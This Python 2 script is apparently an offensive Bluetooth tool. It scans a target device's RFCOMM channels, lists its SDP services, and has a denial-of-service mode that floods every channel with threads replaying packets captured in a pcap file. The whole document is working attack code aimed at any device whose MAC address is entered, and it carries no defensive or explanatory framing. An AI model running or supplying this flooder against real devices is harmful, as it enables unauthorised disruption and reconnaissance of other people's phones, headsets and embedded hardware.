import sys
import bluetooth
from scapy.all import *
import binascii
from time import sleep
from threading import Thread

class mythread(Thread):
	def __init__(self,i,mac,pcap):
		Thread.__init__(self)
		self.h=i
		self.mac = mac
		self.pcap = pcap
		pkts = rdpcap(pcap)
		self.pkts = pkts
	def run(self):
		s = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
		try:
			s.connect((self.mac,self.h))
			for pkt in self.pkts:
				print "in loop"
				print pkt
				print "Trying {}".format(i)
				s.send(pkt)
		except:
			pass

def sdpBrowse(addr):
    services = bluetooth.find_service(address=addr)
    for service in services:
        name = service['name']
        proto = service['protocol']
        port = str(service['port'])
        print('[+] Found ' + str(name)+' on '+ str(proto) + ':'+port)

def scan(addr,port):
	sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
	try:
		sock.connect((addr,port))
		print "{} is open".format(str(port))
		sock.close()
	except:
		pass

if __name__=="__main__":
	print '''
   ___    _____    ___      ___  
  | _ )  |_   _|  | _ \    | __| 
  | _ \    | |    |   /    | _|  
  |___/   _|_|_   |_|_\   _|_|_  
_|"""""|_|"""""|_|"""""|_| """ | 
"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
				By 0xn41k & MrR3boot
'''
	mac = raw_input("Target MAC Address > ")
	print "[+] 1. Scan RFCOMM Ports"
	print "[+] 2. Identify Services"
	print "[+] 3. DOS"
	input = raw_input("> ")
	if input == "1":
		for i in range(1,65535):
			scan(mac,i)
	elif input == "2":
		sdpBrowse(mac)
	elif input == "3":
		pcap = raw_input("Provide pcap path which has rfcomm communication: ")
		print "[-] Depends on the design it may not work in all cases"
		for i in range(1,65535):
			t1 = mythread(i,mac,pcap)
			t1.start()
	else:
		sys.exit()
